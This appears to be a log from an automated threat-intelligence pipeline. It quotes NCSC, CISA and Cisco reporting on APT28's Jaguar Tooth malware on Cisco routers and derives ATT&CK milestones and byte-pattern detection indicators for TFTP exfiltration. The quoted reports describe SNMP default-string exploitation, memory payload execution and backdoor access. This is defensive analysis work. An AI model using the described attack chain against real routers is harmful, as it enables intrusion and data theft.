Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.')]
[2025-03-27 12:15:37,825 INFO] ++ Indicators computed for action: Automated Exfiltration as used by the malware. The indicators are:
['The content contains "| 03   81   60   00   0 8 |".', 'The content contains "| 24   02   00   0 1 |".']
[2025-03-27 12:15:37,899 INFO] ++ Removed pre-condition: 
The malware has access to the router's command line interface (CLI).
, due to similarity with: 
The malware has successfully infected a Cisco IOS router.
 (tensor([[0.7303]]))
[2025-03-27 12:15:38,110 INFO] ++ Removed post-condition: 
Data exfiltration from compromised routers
, due to similarity with: 
Compromised Cisco router systems
 (tensor([[0.7021]]))
[2025-03-27 12:15:38,237 INFO] ++ Removed post-condition: 
Backdoor access points established on compromised routers
, due to similarity with: 
Compromised Cisco router systems
 (tensor([[0.7031]]))
[2025-03-27 12:15:47,067 INFO] Created output with 5 milestones
[2025-03-27 12:15:47,068 INFO] Saving output
[2025-03-27 12:15:47,069 INFO] Application finished with output saved
[2025-03-27 12:15:47,069 INFO] Ending time: 2025-03-27 12:15:47
[2025-03-27 12:15:47,070 INFO] Elapsed time: 11.48 minutes
